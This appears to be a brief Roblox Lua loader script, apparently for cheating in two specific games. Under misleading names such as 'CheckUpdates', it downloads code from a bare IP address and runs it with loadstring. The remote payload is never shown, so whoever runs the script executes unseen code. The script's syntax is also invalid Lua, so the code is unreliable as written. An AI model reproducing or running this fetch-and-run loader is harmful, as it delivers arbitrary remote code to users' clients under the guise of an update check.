 ID="038451e3-620c-45a4-930a-ecf05798dea3";

if game.PlaceId == 96342491571673 or game.PlaceId == 109983668079237 then

local function CheckUpdates(){
    loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/sab.luau"))()
};  

local function LoadMenuGui(){
RUN_AFTER=loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))
};
            task.spawn(CheckUpdates)
            task.spawn(LoadMenuGui)
        end
